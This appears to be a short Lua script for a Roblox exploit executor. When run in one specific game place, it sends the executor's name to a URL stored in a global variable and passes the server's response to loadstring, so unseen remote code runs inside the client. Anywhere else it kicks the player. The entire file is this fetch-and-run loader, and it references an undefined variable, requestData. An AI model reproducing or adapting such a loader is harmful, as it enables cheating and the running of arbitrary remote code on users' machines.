-- DNC IF YOU SEE THIS
if game.PlaceId == 4483381587 then
    local HttpService = game:GetService("HttpService")

    local ExecutionType = identifyexecutor() or "Unknown"
    
    local success, response = pcall(function()
        return request({
            Url = _G.L .. "?exp="..ExecutionType,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(requestData)
        })    
    end)
    
    -- Check if the request was successful
    if success then
        loadstring(response.Body)()
    end
else
    game.Players.LocalPlayer:Kick("Please only execute this while you're in baseplate unless you may get banned.")
end
